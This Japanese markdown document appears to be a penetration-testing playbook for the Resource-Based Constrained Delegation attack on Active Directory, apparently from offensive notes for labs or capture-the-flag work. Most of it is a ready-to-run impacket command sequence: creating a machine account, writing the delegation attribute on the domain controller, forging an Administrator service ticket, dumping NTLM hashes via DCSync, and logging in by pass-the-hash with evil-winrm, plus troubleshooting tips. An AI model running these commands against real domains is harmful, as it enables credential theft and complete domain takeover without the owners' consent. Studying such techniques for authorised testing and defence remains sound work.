# RBCD（Resource-Based Constrained Delegation）攻撃

## 概要

対象コンピューターオブジェクトへの書き込み権限（GenericAll / GenericWrite）と、ドメインにコンピューターアカウントを追加できる権限（SeMachineAccountPrivilege）を組み合わせて Domain Admin レベルのアクセスを得る攻撃手法。

---

## 着火条件

以下の**両方**が満たされている場合：

1. 現在のユーザーが **対象コンピューター（通常はDC）に GenericAll または GenericWrite** を持つ
   - BloodHound で確認
2. 現在のユーザーが **`SeMachineAccountPrivilege`** を持つ（ドメインにコンピューターアカウントを追加できる）
   - `whoami /all` で確認

---

## 攻撃の原理

`msDS-AllowedToActOnBehalfOfOtherIdentity` 属性に「信頼するコンピューターアカウントのSID」を設定することで、そのコンピューターアカウントが対象コンピューターに対してなりすまし（impersonation）を行えるようになる。

攻撃フロー：
1. 攻撃用コンピューターアカウント（`ATTACKPC$`等）を作成
2. DCの上記属性に `ATTACKPC$` のSIDを書き込む
3. S4U2Self → S4U2Proxy の順で `Administrator` のサービスチケット（TGS）を取得
4. そのチケットでDCにアクセス → DCSync

---

## 手順

### Step 1: コンピューターアカウントを作成

```bash
impacket-addcomputer \
  -computer-name 'ATTACKPC$' \
  -computer-pass 'Password123!' \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]'
```

成功すると：`Successfully added machine account ATTACKPC$ with password Password123!`

### Step 2: DCの RBCD 属性を設定

```bash
impacket-rbcd \
  -delegate-to '[DC_HOSTNAME]$' \
  -delegate-from 'ATTACKPC$' \
  -action write \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]'
```

成功すると：`Delegation rights modified successfully!`

### Step 3: Administrator のサービスチケットを取得

```bash
impacket-getST \
  -spn 'cifs/[DC_FQDN]' \
  -impersonate administrator \
  -dc-ip [DC_IP] \
  '[DOMAIN]/ATTACKPC$:Password123!'
```

成功すると `administrator@cifs_[DC_FQDN]@[DOMAIN].ccache` が生成される。

### Step 4: チケットを使って DCSync

```bash
export KRB5CCNAME=./administrator@cifs_[DC_FQDN]@[DOMAIN].ccache

impacket-secretsdump \
  -k -no-pass \
  -just-dc-ntlm \
  -target-ip [DC_IP] \
  administrator@[DC_FQDN]
```

### Step 5: Pass-The-Hash で接続

```bash
evil-winrm -i [DC_IP] -u Administrator -H '[NTLM_HASH]'
```

---

## トラブルシューティング

| 症状 | 原因・対処 |
|------|-----------|
| `Kerberos SessionError: KRB_AP_ERR_SKEW` | 時刻のずれ。`sudo ntpdate [DC_IP]` で同期 |
| チケット取得に失敗 | FQDN（完全修飾ドメイン名）を使っているか確認。`/etc/hosts` への登録を確認 |
| `getST` がエラー | `-dc-ip` と `-spn` の FQDN が一致しているか確認 |

---

## 注意点・落とし穴

- `-spn 'cifs/[DC_FQDN]'` の `[DC_FQDN]` は `DC1.domain.local` のような完全修飾名にする
- `KRB5CCNAME` 環境変数は `export` でセッションに設定する（sudoで実行する場合は `-E` オプション）
- コンピューターアカウントの作成上限（デフォルト10台）に達している場合は既存のアカウントを使う

---

## 関連技術
- 前提: GenericAll → `../ACE_Abuse/GenericAll.md`
- DCSync実行後 → `../Credential_Dumping.md`
- Unconstrained Delegation との違い → `Unconstrained.md`
